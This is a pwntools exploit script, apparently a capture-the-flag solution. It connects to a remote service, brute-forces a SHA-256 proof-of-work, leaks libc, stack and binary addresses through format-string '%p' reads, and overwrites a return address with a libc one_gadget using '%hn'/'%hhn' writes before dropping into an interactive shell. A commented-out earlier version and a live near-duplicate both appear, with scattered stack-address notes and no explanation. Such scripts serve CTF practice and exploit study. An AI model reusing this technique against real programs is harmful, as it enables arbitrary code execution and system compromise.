# #! /usr/bin/env python3
# import logging
#
# from pwn import *
#
# # context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='amd64')
# context.terminal = ['tmux','splitw','-h']
#
#
# p = remote('chuj.top', '52053')
# # p = process('./echo1')
# elf = ELF('./echo1')
# libc = ELF("./libc-2.31.so")
#
# def debug():
#     gdb.attach(p)
#     pause()
#
# from pwnlib.util.iters import mbruteforce
# import itertools
# import base64
#
# p.recvuntil(') == ')
# hash_code = p.recvuntil('\n', drop=True).decode().strip()
# log.success('hash_code={},'.format(hash_code))
#
# charset = string.printable
# proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed')
#
# p.sendlineafter('????> ', proof)
#
#
#
# p.recvuntil("your content's length:\n>> ")
#
# p.sendline('268435455')
# p.sendline('%13$p')
#
# __libc_start_main_addr = int(p.recv(14)[2:],16) - 243
# log.success('__libc_start_main_addr: ' + hex(__libc_start_main_addr))
#
# libc.address = __libc_start_main_addr - libc.symbols['__libc_start_main']
# log.success('libc.address: ' + hex(libc.address))
#
# one_addr = libc.address + 0xe6c81
# log.success('one_addr: ' + hex(one_addr))
#
# p.recvuntil("your content's length:\n>> ")
# p.sendline('268435455')
#
# p.sendline('%6$p')
# stack_addr = int(p.recv(14)[2:],16)
# log.success('stack_addr: ' + hex(stack_addr))
#
# ret_addr = stack_addr+8
# log.success('ret_addr: ' + hex(ret_addr))
#
#
# p.recvuntil("your content's length:\n>> ")
#
# p.sendline('268435455')
# p.sendline('%11$p')
# elf.address = int(p.recv(14)[2:],16) - 0x12C2
# log.success('elf.address: ' + hex(elf.address))
#
# # 改链子
# p.recvuntil("your content's length:\n>> ")
# p.sendline('268435455')
# payload = '%'+ str((stack_addr&0xff)+0x18) + 'c' + '%6$hhn'
# p.sendline(payload)
#
# # 改main 双字节
# p.recvuntil("your content's length:\n>> ")
#
# p.sendline('268435455')
# payload = '%'+ str((one_addr&0xffff)) + 'c' + '%10$hn'
# p.sendline(payload)
#
#
# # 改链子
# p.recvuntil("your content's length:\n>> ")
#
# p.sendline('268435455')
# payload = '%'+ str((stack_addr&0xff)+0x18+0x2) + 'c' + '%6$hhn'
# p.sendline(payload)
#
#
#
# # 改main 单字节
# p.recvuntil("your content's length:\n>> ")
#
# p.sendline('268435455')
# payload = '%'+ str(((one_addr>>16)&0xff)) + 'c' + '%10$hhn'
# p.sendline(payload)
#
#
#
# # 改链子
# p.recvuntil("your content's length:\n>> ")
# # debug()
#
# p.sendline('268435455')
# payload = '%'+ str((stack_addr&0xff)-0x28) + 'c' + '%6$hhn'
# p.sendline(payload)
#
# p.recvuntil("your content's length:\n>> ")
#
# p.sendline('268435455')
# payload = '%'+ str(806) + 'c' + '%10$hn'
# p.sendline(payload)
#
#
# p.interactive()

# 0x7fff92af6ef0
# 0x7fff92af6ed0 —▸ 0x7fff92af6ef0 —▸ 0x7fff92af6f00
# 0x7fff92af6ec8



# 0x7ffdf37d5fb0 —▸ 0x7ffdf37d5fd0 —▸ 0x7ffdf37d5fe0
# 0x7ffdf37d5fd0
# 0x7ffdf37d5fe8

# 0x7ffe1999da38
# 0x7ffe1999da39
# 0x7ffe1999da4a
# 0x7ffe1999da4b
# 0x7ffe1999da4c
# 0x7ffe1999da4d
# 0x7ffe1999da4e
# 0x7ffe1999da4f


# 0x7fff27ed1f10 —▸ 0x7fff27ed1f30 —▸ 0x7fff27ed1f4a
# 0x7fff27ed1f08
# 0x7fff27ed1f30

# 0x30-0x28



#! /usr/bin/env python3
import logging

from pwn import *

# context(os='linux', arch='amd64', log_level='debug')
context(os='linux', arch='amd64')
context.terminal = ['tmux','splitw','-h']



p = remote('chuj.top', '52053')
# p = process('./echo1')
elf = ELF('./echo1')
libc = ELF("./libc-2.31.so")

def debug():
    gdb.attach(p)
    pause()


from pwnlib.util.iters import mbruteforce
import itertools
import base64

p.recvuntil(') == ')
hash_code = p.recvuntil('\n', drop=True).decode().strip()
log.success('hash_code={},'.format(hash_code))

charset = string.printable
proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed')

p.sendlineafter('????> ', proof)


p.recvuntil("your content's length:\n>> ")

p.sendline('268435455')
p.sendline('%13$p')

__libc_start_main_addr = int(p.recv(14)[2:],16) - 243
log.success('__libc_start_main_addr: ' + hex(__libc_start_main_addr))

libc.address = __libc_start_main_addr - libc.symbols['__libc_start_main']
log.success('libc.address: ' + hex(libc.address))

one_addr = libc.address + 0xe6c81
log.success('one_addr: ' + hex(one_addr))

p.recvuntil("your content's length:\n>> ")
p.sendline('268435455')

p.sendline('%6$p')
stack_addr = int(p.recv(14)[2:],16)
log.success('stack_addr: ' + hex(stack_addr))

ret_addr = stack_addr+8
log.success('ret_addr: ' + hex(ret_addr))


p.recvuntil("your content's length:\n>> ")

p.sendline('268435455')
p.sendline('%11$p')
elf.address = int(p.recv(14)[2:],16) - 0x12C2
log.success('elf.address: ' + hex(elf.address))

# 改链子
p.recvuntil("your content's length:\n>> ")
p.sendline('268435455')
payload = '%'+ str((stack_addr&0xff)+0x18) + 'c' + '%6$hhn'
p.sendline(payload)

# 改main 双字节
p.recvuntil("your content's length:\n>> ")

p.sendline('268435455')
payload = '%'+ str((one_addr&0xffff)) + 'c' + '%10$hn'
p.sendline(payload)


# 改链子
p.recvuntil("your content's length:\n>> ")

p.sendline('268435455')
payload = '%'+ str((stack_addr&0xff)+0x18+0x2) + 'c' + '%6$hhn'
p.sendline(payload)



# 改main 单字节
p.recvuntil("your content's length:\n>> ")

p.sendline('268435455')
payload = '%'+ str(((one_addr>>16)&0xff)) + 'c' + '%10$hhn'
p.sendline(payload)



# 改链子
p.recvuntil("your content's length:\n>> ")
# debug()

p.sendline('268435455')
payload = '%'+ str((stack_addr&0xff)-0x28) + 'c' + '%6$hhn'
p.sendline(payload)

p.recvuntil("your content's length:\n>> ")

p.sendline('268435455')
payload = '%'+ str((elf.address+4902)&0xffff) + 'c' + '%10$hn'
log.success('csu_addr: ' + hex((elf.address+4902)&0xffff))
p.sendline(payload)

p.interactive()
